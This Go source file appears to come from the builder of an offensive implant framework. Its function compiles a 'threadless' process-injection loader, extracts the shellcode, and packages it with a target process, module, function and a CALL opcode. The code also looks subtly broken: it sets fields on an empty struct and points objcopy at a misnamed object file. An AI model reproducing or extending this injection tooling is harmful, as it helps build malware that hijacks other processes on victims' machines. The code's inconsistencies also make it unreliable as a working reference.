package core

import (
	"fmt"
	"os"
)

type Injection struct {
}

func (h *HexaneConfig) GetInjectConfig() (*Injection, error) {
	var (
		err    error
		loader []byte
	)

	InjectCfg := new(Injection)
	opcode := []byte{0xE8, 0x00, 0x00, 0x00, 0x00}

	LoaderAsm := h.Compiler.BuildDirectory + "/threadless.asm"
	LoaderObj := h.Compiler.BuildDirectory + "/threadless.asm.o"
	LoaderData := h.Compiler.BuildDirectory + "/threadless.bin"

	Execute := h.Implant.Injection.Threadless.Execute
	InjectCfg.ExecuteObj = Execute + ".o"

	WrapMessage("DBG", fmt.Sprintf("generating execute object %s", Execute))
	if err = h.CompileObject(h.Compiler.Mingw+" -c ", InjectCfg.ExecuteObj, []string{Execute}, h.Compiler.Flags, h.Compiler.Includes, nil); err != nil {
		return nil, err
	}

	WrapMessage("DBG", "generating Threadless loader object")
	if err = h.CompileObject(h.Compiler.Mingw+" -c ", LoaderObj, []string{LoaderAsm}, nil, h.Compiler.Includes, nil); err != nil {
		return nil, err
	}

	WrapMessage("DBG", "extracting .text from loader object")
	if err = h.RunCommand(h.Compiler.Objcopy + " -j .text -O binary " + LoaderObj + ".o " + LoaderData); err != nil {
		return nil, err
	}

	WrapMessage("DBG", "extracting loader shellcode")
	if loader, err = os.ReadFile(LoaderData); err != nil {
		return nil, err
	}

	WrapMessage("DBG", "allocating injection strings config")
	InjectCfg.Strings = []string{
		h.UserConfig.Builder.Loader.Config.(*Threadless).TargetProc,
		h.UserConfig.Builder.Loader.Config.(*Threadless).TargetModule,
		h.UserConfig.Builder.Loader.Config.(*Threadless).TargetFunc,
		string(opcode),
		string(loader),
	}

	return InjectCfg, nil
}
